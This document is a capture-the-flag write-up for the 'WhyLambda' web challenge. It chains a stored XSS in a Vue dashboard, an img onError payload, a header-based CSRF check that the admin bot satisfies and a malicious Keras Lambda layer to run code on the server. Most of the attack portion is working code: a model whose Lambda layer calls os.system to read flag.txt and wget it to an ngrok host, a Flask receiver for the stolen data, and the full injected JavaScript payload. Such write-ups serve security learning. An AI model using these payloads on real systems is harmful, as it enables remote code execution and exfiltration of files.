# HTB-WhyLambda-Writeup
Let's begin by looking at what the web application let you do. Upon opening the page you see that the index has nothing more than a bunch of images and text messages, but in the navigation bar you see that there is a **dashboard** and a **try** section.
The **dashboard** requires that you log in, while the **try** section apparently allow you to draw in a canvas and let a pre-defined neural network convert said image into a digit.
Moreover, after doing so you will also be allowed to send a complaint, in order to for example tell the admins about a wrong prediction.

![image](https://github.com/user-attachments/assets/8938e585-0679-4de6-840f-fabe3a31e849)


Let's start by looking at the code, as we can see it is split in two parts, the frontend and the backend. Moreover, inside **entrypoint.sh** we can see that it is randomly generating the password for the admin, 

```sh
echo "ALIENT_PASSWORD=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)" >> /app/backend/.env
```

So we are most surely not going to bruteforce it.
The only input that we can provide to the server are the canvas and the complaint, so let's take a look at what happens with what we provide to the server.
The request look like this:

```http
POST /api/complaint HTTP/1.1
Host: 94.237.59.180:37837
Content-Length: 23597
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
sec-ch-ua-platform: "Linux"
Accept-Language: it-IT,it;q=0.9
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
Content-Type: application/json
sec-ch-ua-mobile: ?0
X-SPACE-NO-CSRF: 1
Accept: */*
Origin: http://94.237.59.180:37837
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:1337/try
Accept-Encoding: gzip, deflate, br
Cookie: space_cookie=EOulkHxYTIGsmGiITApl-msKFwneuTgCVPexcgU8tFU
Connection: keep-alive

{
  "description":"The prediction is wrong!!",
  "image_data":"data:image/png;base64,iVBOR..............gg==",
  "prediction": 8
}
```
The data is sent to the internal server that is at **backend/app.py**, and then is retreived when the admin looks at the dashboard.
The code related to the dashboard is the following:

```vue
<template>
<Block :title="title" :description="description">
    <template v-slot:content>
        <Login @success="showDashboard()" v-if="!loggedIn"/>
        <div v-else>
            <div class="upload">
                <h1 class="upload-title">Upload and test a new version of the model</h1>
                <input type="file" ref="file"/>
                <SpaceButton :title="'Submit'" @spaceClick="submitModel()"></SpaceButton>
                <p v-if="uploadText">{{ uploadText }}</p>
            </div>
            <br/>
            <div v-if="complaints.length < 1">
                <h2>No complaints!</h2>
            </div>
            <template v-else v-for="(c, key) in complaints" :key="key">
                <ImageBanner :title="c.description" :image="c.image_data" :textContent="getPredictionText(c)"></ImageBanner>
            </template>
        </div>
    </template>
</Block>
</template>

....
getPredictionText(complaint) {
            return `<p>Our amazing model said the image represented the digit: <b>${complaint.prediction}</b></p>`;
        }
....
```

The complaints are stored in a custom type, **ImageBanner**, its code is the following:

```vue
<template>
    <div class="banner">
        <div class="image-container">
            <img :src="image" class="image">
        </div>
        <div class="text-container">
            <h2 class="banner-title">{{ title }}</h2>
            <span class="text" v-html="textContent"></span>
        </div>
    </div>
</template>
```
Bingo! ```html <span class="text" v-html="textContent"> ``` is vulnerable to XSS!
Remember that the **textContent** variable is related to the prediction in the complaint!
By looking more at the code we can see that at **backend/app.py** there is the handling function related to the path **/api/complaint**:

```python
@app.route("/api/complaint", methods=["POST"])
@csrf_protection
def submit_complaint():
    description = request.json.get("description", None)
    image_data = request.json.get("image_data", None)
    prediction = request.json.get("prediction", None)
    if not description or not image_data or prediction == None:
        return message("Parameters 'description', 'image_data' and 'prediction' requred"), 400
    
    complaints.add_complaint(description, image_data, prediction)

    Thread(target=complaints.check_complaints, args=(ALIEN_USERNAME, ALIENT_PASSWORD,)).start()

    return jsonify(), 204
```

So it creates a new thread that will check the complaint, let's look at the code there:

```python
def check_complaints(username, password):
    options = Options()
    options.add_argument('--headless')
    options.add_argument('--no-sandbox')
    browser = webdriver.Chrome(options=options)

    browser.get("http://127.0.0.1:1337/dashboard")

    browser.find_element(By.NAME, "username").send_keys(username)
    browser.find_element(By.NAME, "password").send_keys(password)
    browser.find_element(By.CLASS_NAME, "button-container").click()

    time.sleep(10)

    browser.quit()
```

Here we can see that a bot will open the dashboard, log into the server using the right credentials and then wait 10 seconds.
The idea here could be to somehow abuse the XSS vulnerability on the **dashboard** to steal the credentials (or the cookie) stored in the server to obtain access to the dashboard.
This is unfortunately impossile since the cookie is set to **HttpOnly**, thus making it impossible to read through scripts, so we should find another way.
Moreover, there is another slight complication to the XSS.
If we try to send a complaint having the prediction changed to **"<script> fetch('http://<webhook.server>').then(response => alert("get_pwnd") </script>"** you can easily see that you won't get any ping to your webhook server.
If you also try to run locally the web application (after changing the entrypoint to set the password to, for example, 1234, and open the dashboard after having sent said complaint, you can see that the script is there but is not executed!

To be able to run javascript code a possibility is to exploit the **onError** attribute of the html object **img**.
Sending a complaint to the web app running locally that looks like this: **"<img src=\"pwn\" onError=\"alert('Executed');\">"**
after opening the dashboard and loading in, you obtain your alert!
Good, now we know that it is possible to exploit an XSS vulnerability on the bot, that is logged to the server as an admin.

Since we cannot steal the cookie, we will have to make the bot do the requests in our behalf.
Let's jump back for a second and look at the **@csrf_protection** decorator, that will lead us to this code:

```python
def csrf_protection(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        csrf_header = request.headers.get("X-SPACE-NO-CSRF")
        if csrf_header != "1":
            return jsonify({"error": "Invalid csrf token!"}), 403
        
        return f(*args, **kwargs)
    return decorated_function
```

Here we see that it checking that the custom **X-SPACE-NO-CSRF** header is present and set to "1".
This is a slight nuissance, we just simply need to remember to add it in our requests to the internal server!

Great, now we know that we can exploit the XSS to send requests to the internal api server using the bot, which is autenticated, and we know that we need to add the custom header, but what should we do now?
If we look again at the code in **backend/app.py** we can see that there is another POST method, that requires autentication.
If you ran the application locally and changed the password and tried to login and look at the dashboard, you already know what i'm talking about.
In the dashboard there is the possibility to send to the internal server a new neural network model, in the **.h5** format, that will be used by the Keras library, from Tensorflow.
Here the **.h5** file is loaded and tested against some values.

By doing some reaserce online i was able to find a RCE vulnerability in tensorflow 2.12.0 and below, by abusing the so called Lambda layers, that are custom layers that takes a user defined function and executes it during the prediction steps. This was done in order to allow
programmers to define custom operations to be done with the data provided to the network. The problem is that it is possible to simply import the **os** python library and execute shell commands while testing the network.
The idea here is then to create a new model, called **attack_model.h5**, that contains a Lambda layer that allows us to read the flag and send it to our webhook server.
But how can we send the model to the internal api?

We need to exploit the XSS vulnerability. We can create a Flask server that runs locally (and is tunneled thanks to ngrok) and when receiving a get request to the **/my_file** path simply sends back the contents of the **attack_model.h5** file.
When doing this we need to remember to set ```Access-Control-Allow-Origin = '*'``` in our server, otherwise the request will be blocked.

Lets look at the code for the creation of the **attack_model.h5**

```python
from tensorflow import keras
import json
import random
from tensorflow import keras
from keras.datasets import mnist
from keras.utils.np_utils import to_categorical
from keras.models import Sequential
from keras.layers.core import Dense, Dropout, Activation, Lambda

def exploit(x):
	import os
	ngrok_ip = "<redacted>"
	os.system("flag=$(cat ./../flag.txt);url='http://" + ngrok_ip + "/?flag=';wget $(echo $url$flag)")
	return x


(X_train, y_train), (X_test, y_test) = mnist.load_data()

X_test = X_test.reshape(10000, 784)
X_test = X_test.astype("float32")
X_test /= 255
n_classes = 10
Y_test = to_categorical(y_test, n_classes)

model = Sequential()

model.add(Dense(10, input_shape=(784,)))
model.add(Lambda(exploit))

model.compile(loss="categorical_crossentropy", metrics=["accuracy"], optimizer="adam")

model.save("attack_model.h5")
```

And then the code of the Flask python server to run locally:

```python
from flask import Flask, send_from_directory, jsonify, request, Response
from flask_cors import CORS
import os
import string
import random
import json
import random
from tensorflow import keras
from keras.datasets import mnist
from keras.utils.np_utils import to_categorical
from keras.models import Sequential
from keras.layers.core import Dense, Dropout, Activation

app = Flask(__name__)
# Enable CORS for all origins (Access-Control-Allow-Origin: *)
#This is necessary to allow the server to download our attack_model.h5
CORS(app, supports_credentials=True)

def message(content: str):
    return jsonify({"message": content})

def test_model(path):
    m = keras.models.load_model(path)
    #metrics = m.evaluate(X_test, Y_test)
    return message("ok")    

@app.route('/my_file', methods=['GET'])
def serve_file():
    filename = 'attack_model.h5'

    if os.path.exists(os.path.join(".", filename)):
        response = send_from_directory(".", filename, as_attachment=True, mimetype='application/octet-stream')
        response.headers['Content-Disposition'] = 'attachment; filename=model.h5'
        return response
    else:
        return jsonify({'error': 'File not found'}), 404

@app.route('/', methods=['GET'])
def read_flag():
    # Get the 'flag' query parameter from the request
    flag = request.args.get('flag')
    # Print the value of 'flag' to the console
    if flag:
        print(f"Flag parameter received: {flag}")
    else:
        print("No flag parameter received.")
    
    # Return the 'flag' value in the response
    return jsonify({
        "message": "Flag received",
        "flag": flag
    })
# Start the Flask server
if __name__ == '__main__':
    app.run(debug=True, port=3333)
```

In order to allow the bot to connect to our server that runs locally you can use ngrok, with the following command:

```sh
ngrok tcp 3333
```

The final step is to create the javascript code that we want the bot to execute. We first want him to do a GET request to our server and take the contents of the **attack_model.h5**, then send a POST request to the internal server, at **/api/internal/model**,
to send the malicious neural network. Once that is done, the internal server will execute the code hidden inside the network and send back the flag to our server.
The javascript code in a pretty format is the following:

```javascript
const postForm = async (url, formData) => { 
  return await fetch(url, { 
    method: 'POST', 
    body: formData, 
    headers: { 
      'X-SPACE-NO-CSRF': '1', // Custom header to bypass CSRF protection
    }, 
    credentials: 'include', // Include cookies with the request
  });
};

fetch('http://<ngrok_ip>/my_file')
  .then(response => response.blob()) // Convert the response to a blob
  .then(blob => {
    const my_file = new File([blob], 'pwn.h5', { type: 'application/x-hdf' }); // Create a File object
    const formData = new FormData(); // Create FormData to send the file
    formData.append('file', my_file); // Append the file to FormData

    postForm('/api/internal/model', formData); // Post the form data
  });
```

The payload to insert on the **prediction** field in the POST request to send a complaint is the following:

```http
"<img src=\"pwn\" onError=\"const postForm = async (url, formData) => { return await fetch(url, { method: 'POST', body: formData, headers: { 'X-SPACE-NO-CSRF': '1', }, credentials: 'include', }) }; fetch(`http://<ngrok_ip>:19092/my_file`).then(response => response.blob()).then( blob => { const my_file = new File([blob], 'pwn.h5', { type: 'application/x-hdf'}); const formData = new FormData(); formData.append('file', my_file); postForm('/api/internal/model', formData);})\" "
```
